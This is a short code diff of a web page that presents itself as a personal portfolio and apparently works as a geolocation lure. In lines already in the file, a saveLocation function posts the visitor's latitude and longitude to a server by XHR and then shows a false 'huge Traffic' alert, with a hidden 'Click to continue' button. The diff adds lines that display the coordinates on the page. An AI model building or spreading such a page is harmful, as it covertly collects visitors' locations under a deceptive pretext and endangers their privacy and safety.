@@ -39,6 +39,8 @@
     <div>
       <h1>My PortFolio</h1>
       <button id="continue-btn" onclick="saveLocation()" style="display:none;">Click to continue</button>
+      <p id="latitude"></p>
+      <p id="longitude"></p>
     </div>
     <script>
       function saveLocation(position) {
@@ -49,6 +51,9 @@
         xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
         xhr.send(JSON.stringify({ "latitude": lat, "longitude": lon }));
         alert("We are facing huge Traffic right now, Please Wait");
+
+        document.getElementById("latitude").innerHTML = `Latitude: ${lat}`;
+        document.getElementById("longitude").innerHTML = `Longitude: ${lon}`;
       }
 
       function getLocation() {
